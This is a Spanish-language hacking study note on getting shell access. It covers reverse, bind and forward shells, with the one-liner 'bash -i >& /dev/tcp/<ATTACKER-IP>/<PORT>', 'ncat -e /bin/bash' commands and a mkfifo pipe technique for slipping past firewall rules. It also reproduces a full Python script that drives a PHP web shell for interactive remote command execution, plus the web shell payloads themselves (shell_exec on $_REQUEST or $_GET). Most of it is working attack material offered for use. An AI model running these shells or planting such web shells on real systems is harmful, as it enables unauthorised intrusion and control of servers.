---------
Resumen
- Reverse Shell: El servidor envía una shell al atacante conectándose a través de un puerto abierto en su máquina.
- Bind Shell: El servidor abre un puerto y ofrece una shell a cualquier persona que se conecte a él.


### Rever Shell
Este método tiene como objetivo que el servidor le envíe una shell al atacante. El atacante deja abierto un puerto en su máquina host y en el servidor ejecuta un oneliner para que este envíe una /bin/bash a su dirección ip por el puerto abierto.

ATACANTE  MODO ESCUCHA
```bash
nc -nlvp 443
```

**SERVIDOR**
```bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
```
Con ncat
```bash
ncat -e /bin/bash 172.23.0.1 443
```
### Bind Shell
Este método es el inverso a la rever shell, en este caso es en el servidor donde se abre un puerto ofreciendo una /bin/bash para todo aquel que se conecte. Por tanto el atacante simplemente se conecta al servidor poniendo la ip y el puerto abierto.

SERVIDOR MODO ESCUCHA OFRECIENDO UNA BASH
```bash
ncat -nlvp 443 -e /bin/bash
```

ATACANTE CONECTÁNDOSE AL SERVIDOR
```bash
ncat 172.23.0.4 443
```
### Forward Shell
En caso de que los dos primero métodos no funcionen porque se haya configurado una serie de reglas iptables que bloqueen la comunicación pues se recurre a la forward shell que se utiliza para eludir estas reglas. El concepto básico es que se utilizan dos archivos, uno donde se introduce el output y otro donde se extrae el output. Cuando el atacante consigue crear estos dos archivos puede jugar con los pipes (tuberías) para redirigir y tratar el flujo de la información como el quiera.
A continuación explicaré mas o menos como sería:
Crea un archivo con nombre input (no necesariamente debe ser este nombre) donde se introducirán los comandos a ejecutar, pero este archivo no es un archivo txt normal, tiene que ser creado con mkfifo. Con mkfifo podemos crear archivos que sirvan como canalizadores de la información, los datos que sean introducidos en este podemos ejecutarlo en una bash y redirigir el output a un archivo normal (.txt) 
Aunque también podríamos hacerlo con un archivo txt normal pero la diferencia es que un archivo mkfifo nunca guarda ningún dato almacenado, si hacemos un cat a un archivo mkfifo lo que vamos a ver es que el proceso se va a quedar a la espera hasta  que se introduzca algún dato. Es decir si metemos con echo un **{echo "HOLA MUNDO" > archivomkfifo}** seguidamente se finalizará el cat a ese archivo porque ya si tiene contenido y veremos HOLA MUNDO en la consola.
Si volvemos a catear el archivo pasará lo mismo porque este archivo no está diseñado para almacenar la información indefinidamente sino que es como un canalizador de datos para poder redirigir el output según nuestros intereses.
Ejemplo:
```bash
mkfifo input; touch output
cat input | /bin/bash > output
```

En este caso estamos cateando el archivo input para que cuando se introduzca algún dato en el mismo sea ejecutado por una bash y rediriga el resultado en el archivo output. 
De manera que si yo con echo introduzco un comando como por ejemplo **(echo "whoami" > input)** podré ver el resultado del comando en el archivo output

Ahora puedo hacer lo siguiente, abrir dos terminales donde en uno sea para introducir comandos y otro para visualizar el resultado
1º Terminal ejecutamos el siguiente bucle infinito
```bash
while true;do cat input | /bin/bash > output && cat output; done
```

2º Terminal podemos ejecutar cualquier comando que introduzcas en el archivo mkfifo
```bash
echo "whoami" > input
```
Ahora seguidamente veremos el output del resultado en la primera terminal.

También se puede hacer con tail -f, si no sabes que hace esto mira [[Filtrar y ordenar datos]].
```bash
tail -f in | /bin/bash > on
```

Para ver el resultado cateas el on, puedes dejarlo automático de la siguiente manera. Este comando se explica en [[Crontab Tareas programadas]]
```bash
watch -n 1 cat on
```

**SCRIPT PARA AUTOMATIZAR TODO ESTE PROCESO**
Una vez entendido esto podemos ejecutar con python3 el siguiente script que nos dará una terminal interactiva, se encuentra en el siguiente repositorio: https://github.com/s4vitar/ttyoverhttp
```python
#!/usr/bin/python3

import requests, time, threading, pdb, signal, sys
from base64 import b64encode
from random import randrange

class AllTheReads(object):
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()

	def run(self):
		readoutput = """/bin/cat %s""" % (stdout)
		clearoutput = """echo '' > %s""" % (stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				RunCmd(clearoutput)
				print(output)
			time.sleep(self.interval)

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
        	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
		}
	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
	return result

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
	}
	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
	return result

def ReadCmd():
        GetOutput = """/bin/cat %s""" % (stdout)
        output = RunCmd(GetOutput)
        return output

def SetupShell():
	NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
	try:
		RunCmd(NamedPipes)
	except:
		None
	return None

global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
erasestdin = """/bin/rm %s""" % (stdin)
erasestdout = """/bin/rm %s""" % (stdout)

SetupShell()

ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
	print("\n\n[*] Exiting...\n")
	print("[*] Removing files...\n")
	RunCmd(erasestdin)
	RunCmd(erasestdout)
	print("[*] All files have been deleted\n")
	sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

while True:
	cmd = input("> ")
	WriteCmd(cmd + "\n")
	time.sleep(1.1)
```

> Este script hay que adaptarlo según nuestras necesidades, si conseguimos introducir un archivo .php malicioso hay que especificar el mismo nombre en los siguientes apartados

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
        	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
		}
	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
	return result

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
	}
	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
	return result

> Y teniendo en cuenta que el payload también tiene como nombre cmd.

Ejemplo, creamos un archivo que se llame index.php e introducimos el siguiente payload:
```bash
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```

> Este payload nos permitirá una ejecución remota de comandos en la propia página web desde la propia url.

$\_REQUEST : se utiliza la variable superglobal $\_REQUEST, que combina los valores de $\_GET, $\_POST y $\_COOKIE. Esto significa que el valor de 'cmd' se puede obtener tanto de una solicitud GET como POST o incluso de una cookie. 

También se puede hacer para que solo acepte peticiones por GET de la siguiente manera:
 ```bash
 <?php
	 echo shell_exec($_GET['cmd']);
 ?>
```

### Etiquetas preformateadas
Las etiquetas pre-formateadas nos darán una respuesta mucho más clara a la hora de dumpear información, porque muestra el output respetando los saltos de línea, en cambio sin las etiquetas mostrará el resultado todo en una línea.
En ejemplo anterior no puse las etiquetas preformateadas porque no sería compatible con el script anterior para la Fordward Shell. 
Payload
```php
<?php
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

### WEB PAGES
- [Pentest monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)
